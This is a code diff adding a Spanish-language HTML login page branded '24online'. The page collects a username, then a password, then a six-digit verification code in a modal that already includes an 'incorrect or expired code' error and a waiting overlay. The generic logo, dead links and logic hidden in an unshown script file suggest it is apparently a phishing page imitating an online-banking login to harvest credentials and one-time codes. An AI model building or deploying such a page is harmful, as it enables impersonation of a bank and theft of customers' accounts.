@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Inicia sesión</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat', sans-serif;
+    }
+
+    body {
+      background-color: #f1f4f8;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      color: #333333;
+      position: relative;
+    }
+
+    /* Header */
+    header {
+      background-color: #ffffff;
+      padding: 16px 40px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+      z-index: 1;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+
+    .custom-logo {
+      max-height: 40px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    /* Main Container */
+    main {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-grow: 1;
+      padding: 40px 20px;
+      z-index: 1;
+    }
+
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 40px;
+      width: 100%;
+      max-width: 520px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+      position: relative;
+      min-height: 420px;
+    }
+
+    .step {
+      display: none;
+    }
+
+    .step.active {
+      display: block;
+    }
+
+    /* LOADING OVERLAY VERDE FULLSCREEN */
+    .loading-overlay {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: #e8f5e9;
+      z-index: 99999;
+      gap: 16px;
+    }
+
+    .loading-overlay.active {
+      display: flex;
+    }
+
+    .custom-loader-img {
+      width: 120px;
+      height: auto;
+      object-fit: contain;
+    }
+
+    .loading-text {
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+    }
+
+    /* MODAL DE CÓDIGO DE SEGURIDAD */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 10000;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal-card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 32px 28px;
+      width: 100%;
+      max-width: 440px;
+      text-align: center;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+      position: relative;
+    }
+
+    .modal-card h2 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 10px;
+    }
+
+    .modal-card p {
+      font-size: 14px;
+      color: #6b7280;
+      line-height: 1.4;
+      margin-bottom: 24px;
+    }
+
+    /* Mensaje de Error */
+    .error-alert {
+      display: none;
+      background-color: #fde8e8;
+      color: #e53e3e;
+      border: 1px solid #f8b4b4;
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+
+    .error-alert.active {
+      display: block;
+    }
+
+    /* Inputs de 6 Dígitos */
+    .code-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .code-digit {
+      width: 44px;
+      height: 52px;
+      font-size: 20px;
+      font-weight: 700;
+      text-align: center;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .code-digit:focus {
+      border-color: #009688;
+    }
+
+    .resend-code {
+      display: inline-block;
+      color: #009688;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      margin-bottom: 24px;
+    }
+
+    .resend-code:hover {
+      text-decoration: underline;
+    }
+
+    /* Layout de títulos */
+    .title-row {
+      margin-bottom: 8px;
+    }
+
+    .card h1 {
+      font-size: 32px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 12px;
+    }
+
+    .card p.description {
+      font-size: 15px;
+      color: #555555;
+      line-height: 1.5;
+      margin-bottom: 28px;
+    }
+
+    /* Botón Atrás */
+    .btn-back {
+      background: none;
+      border: none;
+      color: #1a1a1a;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 24px;
+      padding: 0;
+    }
+
+    /* Formularios */
+    .form-group {
+      margin-bottom: 24px;
+    }
+
+    .label-wrapper {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+
+    .label-wrapper label {
+      font-size: 15px;
+      font-weight: 500;
+      color: #4a4a4a;
+    }
+
+    .forgot-link {
+      color: #009688;
+      text-decoration: none;
+      font-size: 14px;
+      font-weight: 600;
+    }
+
+    .input-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+
+    .input-control {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      border: 1px solid #d1d5db;
+      border-radius: 12px;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .input-control:focus {
+      border-color: #009688;
+    }
+
+    .toggle-password {
+      position: absolute;
+      right: 14px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #4b5563;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 16px;
+      background-color: #f0f0f0;
+      color: #a0a0a0;
+      border: none;
+      border-radius: 25px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: not-allowed;
+      transition: background-color 0.2s ease, color 0.2s ease;
+    }
+
+    .btn-submit.active-btn {
+      background-color: #129a88;
+      color: #ffffff;
+      cursor: pointer;
+    }
+
+    #step-1 .btn-submit {
+      margin-bottom: 32px;
+    }
+
+    /* Opciones */
+    .options-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    .option-card {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 16px;
+      border: 1px solid #e5e7eb;
+      border-radius: 12px;
+      text-decoration: none;
+      color: #333;
+    }
+
+    .option-card svg {
+      width: 24px;
+      height: 24px;
+      fill: none;
+      stroke: #1a1a1a;
+      stroke-width: 2;
+    }
+
+    .option-text {
+      display: flex;
+      flex-direction: column;
+      font-size: 13px;
+      color: #6b7280;
+    }
+
+    .option-text span {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a1a;
+    }
+
+    /* Footer */
+    footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 40px;
+      background-color: #ffffff;
+      font-size: 13px;
+      color: #9ca3af;
+      border-top: 1px solid #f3f4f6;
+      z-index: 1;
+    }
+
+    .footer-brand {
+      font-weight: 800;
+      font-size: 18px;
+    }
+
+    .footer-brand .num { color: #f59e0b; }
+    .footer-brand .text { color: #0284c7; font-style: italic; }
+
+    @media (max-width: 640px) {
+      header, footer { padding: 16px 20px; }
+      .options-grid { grid-template-columns: 1fr; }
+      footer { flex-direction: column-reverse; gap: 12px; text-align: center; }
+      .code-digit { width: 38px; height: 46px; font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- LOADING OVERLAY VERDE FULLSCREEN -->
+  <div id="loading" class="loading-overlay">
+    <img src="loading-B_30.gif" alt="Cargando..." class="custom-loader-img" />
+    <span class="loading-text">Espere por favor...</span>
+  </div>
+
+  <!-- MODAL PARA CÓDIGO DE 6 DÍGITOS -->
+  <div id="codeModal" class="modal-overlay">
+    <div class="modal-card">
+      <h2>Necesitamos confirmar tu identidad</h2>
+      <p>Hemos enviado un código de 6 dígitos a tu número registrado o correo electrónico.</p>
+      
+      <!-- ALERTA DE ERROR -->
+      <div id="code-error-msg" class="error-alert">
+        Código incorrecto o expirado
+      </div>
+
+      <form id="form-code" onsubmit="verifyCode(event)">
+        <div class="code-inputs">
+          <input type="text" maxlength="1" class="code-digit" autofocus onkeyup="moveNext(this, 0)" />
+          <input type="text" maxlength="1" class="code-digit" onkeyup="moveNext(this, 1)" />
+          <input type="text" maxlength="1" class="code-digit" onkeyup="moveNext(this, 2)" />
+          <input type="text" maxlength="1" class="code-digit" onkeyup="moveNext(this, 3)" />
+          <input type="text" maxlength="1" class="code-digit" onkeyup="moveNext(this, 4)" />
+          <input type="text" maxlength="1" class="code-digit" onkeyup="moveNext(this, 5)" />
+        </div>
+
+        <div>
+          <a href="#" class="resend-code">¿No recibiste el código? Reenviar</a>
+        </div>
+
+        <button type="submit" id="btn-verify" class="btn-submit" disabled>Confirmar</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Header -->
+  <header>
+    <div class="logo-container">
+      <img src="a.svg" alt="Logo" class="custom-logo" />
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main>
+    <div class="card">
+      
+      <!-- PASO 1: USUARIO -->
+      <div id="step-1" class="step active">
+        <h1>Inicia sesión</h1>
+        <p class="description">
+          Ingresa tu usuario y contraseña.
+        </p>
+
+        <form id="form-step-1" onsubmit="handleUserSubmit(event)">
+          <div class="form-group">
+            <div class="label-wrapper">
+              <label for="usuario">Usuario</label>
+              <a href="#" class="forgot-link">Olvidé mi usuario</a>
+            </div>
+            <input 
+              type="text" 
+              id="usuario" 
+              class="input-control" 
+              oninput="toggleButton('usuario', 'btn-continue')" 
+              autofocus 
+            />
+          </div>
+
+          <button type="submit" id="btn-continue" class="btn-submit" disabled>Continuar</button>
+        </form>
+
+        <div class="options-grid">
+          <a href="#" class="option-card">
+            <svg viewBox="0 0 24 24">
+              <path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+              <circle cx="8.5" cy="7" r="4"></circle>
+              <line x1="20" y1="8" x2="20" y2="14"></line>
+              <line x1="23" y1="11" x2="17" y2="11"></line>
+            </svg>
+            <div class="option-text">
+              Crear
+              <span>Usuario</span>
+            </div>
+          </a>
+
+          <a href="#" class="option-card">
+            <svg viewBox="0 0 24 24">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <div class="option-text">
+              Desbloquear
+              <span>Usuario</span>
+            </div>
+          </a>
+        </div>
+      </div>
+
+      <!-- PASO 2: CONTRASEÑA -->
+      <div id="step-2" class="step">
+        <button type="button" class="btn-back" onclick="goToStep1()">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          Atrás
+        </button>
+
+        <div class="title-row">
+          <h1>Inicia sesión</h1>
+          <p class="description">Ingresa tu contraseña para continuar.</p>
+        </div>
+
+        <form id="form-step-2" onsubmit="handlePasswordSubmit(event)">
+          <div class="form-group">
+            <div class="label-wrapper">
+              <label for="password">Contraseña</label>
+              <a href="#" class="forgot-link">Olvidé mi contraseña</a>
+            </div>
+            <div class="input-wrapper">
+              <input 
+                type="password" 
+                id="password" 
+                class="input-control" 
+                oninput="toggleButton('password', 'btn-login')" 
+              />
+              <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                  <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <button type="submit" id="btn-login" class="btn-submit" disabled>Iniciar sesión</button>
+        </form>
+      </div>
+
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div>
+      ® 2026 - Todos los derechos reservados.
+    </div>
+    <div class="footer-brand">
+      <span class="num">24</span><span class="text">online</span>
+    </div>
+  </footer>
+
+  <!-- Script Externo -->
+  <script src="script.js"></script>
+</body>
+</html>
